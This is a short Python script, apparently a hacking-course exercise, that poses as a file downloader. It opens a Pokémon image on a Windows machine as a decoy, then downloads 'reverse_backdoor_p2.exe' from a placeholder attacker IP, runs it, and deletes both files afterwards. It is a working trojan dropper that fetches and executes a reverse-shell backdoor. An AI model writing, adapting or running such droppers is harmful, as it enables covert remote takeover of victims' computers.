#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 22-09-2020
# Last Updated: 24-09-2020
# Operating System: Windows
# Description: Downloads files from a given url

# Import necessary libraries
import requests, subprocess, os, tempfile


# Define a function that downloads files from a given url
def download(url):
	# Get the response to the 'get' request to the url
	get_response = requests.get(url)
	# Name the files as per the extension of the file from the url
	file_name = url.split("/")[-1]
	# Write the contents of the url to a file
	with open(file_name, "wb") as jpg_file:
		jpg_file.write(get_response.content)

# Locate and download the file to a temporary location
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# Download and open an image
download("https://static.pokemonpets.com/images/monsters-images-800-800/8330-Mega-Flygon.png")
subprocess.Popen("8330-Mega-Flygon.png", shell=True)

# Download the evil file from the hacker server
download("http://<ATTACKER_IP>/malware/reverse_backdoor/reverse_backdoor_p2.exe")
subprocess.call("reverse_backdoor_p2.exe", shell=True)

# Remove the files after execution
os.remove("8330-Mega-Flygon.png")
os.remove("reverse_backdoor_p2.exe")